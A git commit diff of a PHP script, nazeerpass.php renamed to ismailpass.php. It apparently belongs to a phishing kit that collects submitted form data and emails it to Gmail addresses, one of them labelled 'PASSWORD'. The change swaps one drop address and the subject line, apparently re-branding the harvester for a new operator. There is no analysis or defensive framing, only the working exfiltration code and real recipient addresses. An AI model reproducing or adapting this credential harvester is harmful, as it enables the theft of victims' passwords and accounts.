9256b4f2fe934601c71753683509028c0f1087b9
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-15 19:04:28 +0800

    Update and rename nazeerpass.php to ismailpass.php

--- ismailpass.php
+++ ismailpass.php
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'PASSWORD');
         $mail->addAddress('approval.ads.monica.ramey@gmail.com');
-        $mail->addAddress('hibuads87@gmail.com');
+        $mail->addAddress('hommkhommk008@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'NAZEER';
+        $mail->Subject = 'ISMAIL';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
